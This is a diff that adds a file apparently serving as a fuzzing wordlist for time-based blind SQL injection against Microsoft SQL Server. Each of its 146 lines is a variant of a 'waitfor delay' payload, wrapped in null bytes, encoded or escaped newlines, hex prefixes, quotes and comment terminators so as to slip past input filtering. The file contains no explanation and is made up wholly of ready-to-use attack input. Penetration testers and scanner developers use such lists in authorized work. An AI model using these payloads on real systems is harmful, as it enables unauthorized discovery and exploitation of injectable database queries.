@@ -1,0 +1,146 @@
+waitfor delay '00:05'
+waitfor delay '00:05' -- 
+waitfor delay \'00:05\'
+waitfor delay \'00:05\' -- 
+%00 waitfor delay '00:05'
+%00 waitfor delay '00:05' -- 
+%00 waitfor delay \'00:05\'
+%00 waitfor delay \'00:05\' -- 
+%00' waitfor delay '00:05' -- 
+%00';waitfor delay '00:05' -- 
+%00;waitfor delay '00:05'
+%00;waitfor delay '00:05' -- 
+%00;waitfor delay \'00:05\'
+%00;waitfor delay \'00:05\' -- 
+%00\' waitfor delay \'00:05\' -- 
+%00\';waitfor delay \'00:05\' -- 
+%00\\' waitfor delay \\'00:05\\' -- 
+%00\\';waitfor delay \\'00:05\\' -- 
+%0a waitfor delay '00:05'
+%0a waitfor delay '00:05' -- 
+%0a waitfor delay \'00:05\'
+%0a waitfor delay \'00:05\' -- 
+%0a' waitfor delay '00:05' -- 
+%0a';waitfor delay '00:05' -- 
+%0a;waitfor delay '00:05'
+%0a;waitfor delay '00:05' -- 
+%0a;waitfor delay \'00:05\'
+%0a;waitfor delay \'00:05\' -- 
+%0a\' waitfor delay \'00:05\' -- 
+%0a\';waitfor delay \'00:05\' -- 
+%0a\\' waitfor delay \\'00:05\\' -- 
+%0a\\';waitfor delay \\'00:05\\' -- 
+%0d%0a waitfor delay '00:05'
+%0d%0a waitfor delay '00:05' -- 
+%0d%0a waitfor delay \'00:05\'
+%0d%0a waitfor delay \'00:05\' -- 
+%0d%0a' waitfor delay '00:05' -- 
+%0d%0a';waitfor delay '00:05' -- 
+%0d%0a;waitfor delay '00:05'
+%0d%0a;waitfor delay '00:05' -- 
+%0d%0a;waitfor delay \'00:05\'
+%0d%0a;waitfor delay \'00:05\' -- 
+%0d%0a\' waitfor delay \'00:05\' -- 
+%0d%0a\';waitfor delay \'00:05\' -- 
+%0d%0a\\' waitfor delay \\'00:05\\' -- 
+%0d%0a\\';waitfor delay \\'00:05\\' -- 
+' waitfor delay '00:05' -- 
+';waitfor delay '00:05' -- 
+0x00 waitfor delay '00:05'
+0x00 waitfor delay '00:05' -- 
+0x00 waitfor delay \'00:05\'
+0x00 waitfor delay \'00:05\' -- 
+0x00' waitfor delay '00:05' -- 
+0x00';waitfor delay '00:05' -- 
+0x00;waitfor delay '00:05'
+0x00;waitfor delay '00:05' -- 
+0x00;waitfor delay \'00:05\'
+0x00;waitfor delay \'00:05\' -- 
+0x00\' waitfor delay \'00:05\' -- 
+0x00\';waitfor delay \'00:05\' -- 
+0x00\\' waitfor delay \\'00:05\\' -- 
+0x00\\';waitfor delay \\'00:05\\' -- 
+0x0a waitfor delay '00:05'
+0x0a waitfor delay '00:05' -- 
+0x0a waitfor delay \'00:05\'
+0x0a waitfor delay \'00:05\' -- 
+0x0a' waitfor delay '00:05' -- 
+0x0a';waitfor delay '00:05' -- 
+0x0a;waitfor delay '00:05'
+0x0a;waitfor delay '00:05' -- 
+0x0a;waitfor delay \'00:05\'
+0x0a;waitfor delay \'00:05\' -- 
+0x0a\' waitfor delay \'00:05\' -- 
+0x0a\';waitfor delay \'00:05\' -- 
+0x0a\\' waitfor delay \\'00:05\\' -- 
+0x0a\\';waitfor delay \\'00:05\\' -- 
+0x0d0a waitfor delay '00:05'
+0x0d0a waitfor delay '00:05' -- 
+0x0d0a waitfor delay \'00:05\'
+0x0d0a waitfor delay \'00:05\' -- 
+0x0d0a' waitfor delay '00:05' -- 
+0x0d0a';waitfor delay '00:05' -- 
+0x0d0a;waitfor delay '00:05'
+0x0d0a;waitfor delay '00:05' -- 
+0x0d0a;waitfor delay \'00:05\'
+0x0d0a;waitfor delay \'00:05\' -- 
+0x0d0a\' waitfor delay \'00:05\' -- 
+0x0d0a\';waitfor delay \'00:05\' -- 
+0x0d0a\\' waitfor delay \\'00:05\\' -- 
+0x0d0a\\';waitfor delay \\'00:05\\' -- 
+;waitfor delay '00:05'
+;waitfor delay '00:05' -- 
+;waitfor delay \'00:05\'
+;waitfor delay \'00:05\' -- 
+\' waitfor delay \'00:05\' -- 
+\';waitfor delay \'00:05\' -- 
+\\' waitfor delay \\'00:05\\' -- 
+\\';waitfor delay \\'00:05\\' -- 
+\\n waitfor delay '00:05'
+\\n waitfor delay '00:05' -- 
+\\n waitfor delay \'00:05\'
+\\n waitfor delay \'00:05\' -- 
+\\n' waitfor delay '00:05' -- 
+\\n';waitfor delay '00:05' -- 
+\\n;waitfor delay '00:05'
+\\n;waitfor delay '00:05' -- 
+\\n;waitfor delay \'00:05\'
+\\n;waitfor delay \'00:05\' -- 
+\\n\\' waitfor delay \\'00:05\\' -- 
+\\n\\';waitfor delay \\'00:05\\' -- 
+\\r\\n waitfor delay '00:05'
+\\r\\n waitfor delay '00:05' -- 
+\\r\\n waitfor delay \'00:05\'
+\\r\\n waitfor delay \'00:05\' -- 
+\\r\\n' waitfor delay '00:05' -- 
+\\r\\n';waitfor delay '00:05' -- 
+\\r\\n;waitfor delay '00:05'
+\\r\\n;waitfor delay '00:05' -- 
+\\r\\n;waitfor delay \'00:05\'
+\\r\\n;waitfor delay \'00:05\' -- 
+\\r\\n\\' waitfor delay \\'00:05\\' -- 
+\\r\\n\\';waitfor delay \\'00:05\\' -- 
+\n waitfor delay '00:05'
+\n waitfor delay '00:05' -- 
+\n waitfor delay \'00:05\'
+\n waitfor delay \'00:05\' -- 
+\n' waitfor delay '00:05' -- 
+\n';waitfor delay '00:05' -- 
+\n;waitfor delay '00:05'
+\n;waitfor delay '00:05' -- 
+\n;waitfor delay \'00:05\'
+\n;waitfor delay \'00:05\' -- 
+\n\' waitfor delay \'00:05\' -- 
+\n\';waitfor delay \'00:05\' -- 
+\r\n waitfor delay '00:05'
+\r\n waitfor delay '00:05' -- 
+\r\n waitfor delay \'00:05\'
+\r\n waitfor delay \'00:05\' -- 
+\r\n' waitfor delay '00:05' -- 
+\r\n';waitfor delay '00:05' -- 
+\r\n;waitfor delay '00:05'
+\r\n;waitfor delay '00:05' -- 
+\r\n;waitfor delay \'00:05\'
+\r\n;waitfor delay \'00:05\' -- 
+\r\n\' waitfor delay \'00:05\' -- 
+\r\n\';waitfor delay \'00:05\' -- 
